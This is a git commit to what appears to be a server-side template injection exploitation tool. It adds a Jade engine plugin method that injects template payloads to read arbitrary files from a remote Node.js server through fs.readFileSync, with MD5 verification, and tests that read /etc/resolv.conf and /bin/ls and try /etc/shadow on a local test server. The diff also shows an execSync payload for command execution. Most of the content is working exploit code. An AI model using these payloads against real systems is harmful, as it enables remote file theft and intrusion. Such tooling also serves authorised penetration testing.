9a3be0eb7578aa6d44cb87cf61a030440f3963ff
Emilio Pinna <emilio.pinn@gmail.com>
2016-07-09 14:30:08 +0100

    Add --file-read support in Jade and its tests

--- plugins/engines/jade.py
+++ plugins/engines/jade.py
@@ -1,7 +1,7 @@
 from core.check import Check
 from utils.loggers import log
 from utils import rand
-from utils.strings import quote
+from utils.strings import quote, base64decode, md5
 import string
 
 class Jade(Check):
@@ -38,5 +38,46 @@ class Jade(Check):
 = x.execSync("%s")
 """ % quote(command)
 
-        # TODO: quote command
+        return self.inject(execution_code)
+        
+    def detect_read(self):
+        self.set('read', True)
+        
+    def read(self, remote_path):
+        
+        # Get remote file md5
+        md5_remote = self._md5(remote_path)
+            
+        if not md5_remote:
+            log.warn('Error getting remote file md5, check presence and permission')
+            return
+        
+        # Using base64 since self.execute() calling self.inject() strips
+        # the response, corrupting the data
+        data_b64encoded = self.inject("""- var x = global.process
+- x = x.mainModule.require
+- y = x('fs')
+- z = x('crypto')
+= y.readFileSync('%s').toString('base64')
+""" % remote_path)
+
+        data = base64decode(data_b64encoded)
+        
+        if not md5(data) == md5_remote:
+            log.warn('Remote file md5 mismatch, check manually')
+        else:
+            log.info('File downloaded correctly')
+            
+        return data
+
+    def _md5(self, remote_path):
+        
+        execution_code = """- var x = global.process
+- x = x.mainModule.require
+- y = x('fs')
+- z = x('crypto')
+- y = y.readFileSync('%s').toString()
+= z.createHash('md5').update(y).digest("hex")
+""" % remote_path
+
         return self.inject(execution_code)
--- tests/test_node_jade.py
+++ tests/test_node_jade.py
@@ -15,6 +15,7 @@ class JadeTest(unittest.TestCase):
         'engine': 'jade',
         'eval' : 'javascript' ,
         'exec' : True,
+        'read' : True,
         'trailer_tag': '\n= %(trailer)s\n',
         'header_tag': '\n= %(header)s\n',
         'render_tag': '\n= %(payload)s\n',
@@ -42,3 +43,32 @@ class JadeTest(unittest.TestCase):
         del channel.data['os']
         self.assertEqual(channel.data, self.expected_data)
         
+        
+    def test_file_read(self):
+        template = 'AAAA%sAAAA'
+
+        channel = Channel({
+            'url' : 'http://127.0.0.1:15004/jade?inj=*'
+        })
+        jadeobj = Jade(channel)
+        jadeobj.detect()
+        del channel.data['os']
+        self.assertEqual(channel.data, self.expected_data)
+        
+        # Normal ASCII file
+        readable_file = '/etc/resolv.conf'
+        content = open(readable_file, 'r').read()
+        self.assertEqual(content, jadeobj.read(readable_file))
+        
+        # Long binary file
+        readable_file = '/bin/ls'
+        content = open(readable_file, 'rb').read()
+        self.assertEqual(content, jadeobj.read(readable_file))    
+        
+        # Non existant file
+        self.assertEqual(None, jadeobj.read('/nonexistant'))
+        # Unpermitted file
+        self.assertEqual(None, jadeobj.read('/etc/shadow'))
+        # Empty file
+        self.assertEqual('', jadeobj.read('/dev/null'))
+
